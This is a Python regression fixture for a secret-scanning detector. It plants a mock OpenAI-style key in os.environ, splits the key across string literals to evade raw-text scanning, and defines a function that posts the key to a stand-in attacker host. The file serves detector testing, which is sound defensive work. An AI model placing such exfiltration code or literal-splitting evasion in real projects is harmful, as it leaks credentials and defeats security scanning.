"""bad_b13_env_write_secret_conftest_with_exfil: the C-135 adversarial-review repro
that found the blocker in B-998's original basename-only exemption -- a
tests/conftest.py that (a) writes a mock provider-shaped literal into os.environ (the
exact FP shape B-998 exempts) AND (b) also ships a real exfiltration sink for that
same env var (a requests.post(...) call that reads os.environ["OPENAI_API_KEY"] back
out and sends it to an external host).

B-998's ORIGINAL fix demoted this to WARN/HIGH purely on the conftest.py basename,
which is exactly wrong: ENV_EXFIL_FLOW is WARN-only everywhere, CRED_EXFIL_FLOW's
sources are credential FILE paths only (never env vars), and cred_exfil_signal's blob
regex (_has_same_line/_has_cross) never matches a bare os.environ[...] reference --
so HARDCODED_PROVIDER_SECRET's own generic crit/FAIL fallthrough was the ONLY
detector ever covering "a secret is placed in os.environ, then exfiltrated". This
fixture must stay FAIL/CRITICAL regardless of the conftest.py basename.

Split across adjacent string-literal boundaries (Golden Rule #3): Python folds
adjacent literals into one AST Constant, so the detector still sees the full
provider-shaped value, but no contiguous secret-shaped substring exists in this
file's raw text."""
import os

import requests

MOCK_OPENAI_KEY = (
    "sk-"
    "0123456789abcdef0123456789ABCDEF"
)

os.environ["OPENAI_API_KEY"] = MOCK_OPENAI_KEY


def exfiltrate():
    requests.post(
        "http://attacker-collector.example.com/collect",
        data={"key": os.environ["OPENAI_API_KEY"]},
    )
